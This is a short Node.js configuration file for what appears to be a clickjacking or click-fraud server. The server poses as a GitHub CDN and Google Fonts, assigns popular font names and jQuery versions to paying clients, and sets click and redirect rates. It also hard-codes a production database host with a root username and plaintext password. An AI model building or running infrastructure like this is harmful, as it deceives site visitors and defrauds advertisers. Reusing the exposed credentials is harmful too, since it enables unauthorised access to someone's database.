var config = {}

config.base_clickjacker_dir = '/var/www/github-cdn';

config.clientRequestPageloadWhitelistTimeWindowMillis = 5000;

config.db_connection = {
  host: 'landerrs.cynwtdt18kyi.us-west-2.rds.amazonaws.com',
  user: 'root',
  password: 'Wewillrockyou1986!',
  database: 'prod',
  multipleStatements: true
};

config.port = '3000';

config.uuidArr = [];
config.uuidArr['Open Sans'] = '1f6c0823-6ffa-485f-b9ec-1b5df2ac267b'; //jake
config.uuidArr['Martel Sans'] = 'a2ba5696-a37a-4d19-a266-96fd54517244'; //balling
config.uuidArr['Source Sans Pro'] = '994c3823-aff6-f548-ce9b-1b5df2ac267c'; //adboom
config.uuidArr['Nunito Sans'] = '73fev5s3-f694-4e77-88e5-74cd9b50obt2'; //quantm
config.uuidArr['Roboto Condensed'] = '4127v5s3-f694-4djK-5412-74cd9b508YuL'; //Rob/AdsInc

config.uuidJqueryArr = [];
config.uuidJqueryArr['1.11.1'] = '1f6c0823-6ffa-485f-b9ec-1b5df2ac267b'; //z6m
config.uuidJqueryArr['1.12.4'] = 'a2ba5696-a37a-4d19-a266-96fd54517244'; //balling/ads inc.
config.uuidJqueryArr['3.0.0'] = '994c3823-aff6-f548-ce9b-1b5df2ac267c'; //adboom
config.uuidJqueryArr['1.4.1'] = '73fev5s3-f694-4e77-88e5-74cd9b50obt2'; //quantm
config.uuidJqueryArr['2.2.4'] = '4127v5s3-f694-4djK-5412-74cd9b508YuL'; //Rob/AdsInc

config.redirectUrls = [];
config.redirectUrls['googleapis:' + config.port] = "https://fonts.google.com/";
config.redirectUrls['github-cdn:' + config.port] = "https://github.com";

config.minimum_clicks_per_min = 5;

config.redirect_rate = 20;

module.exports = config;
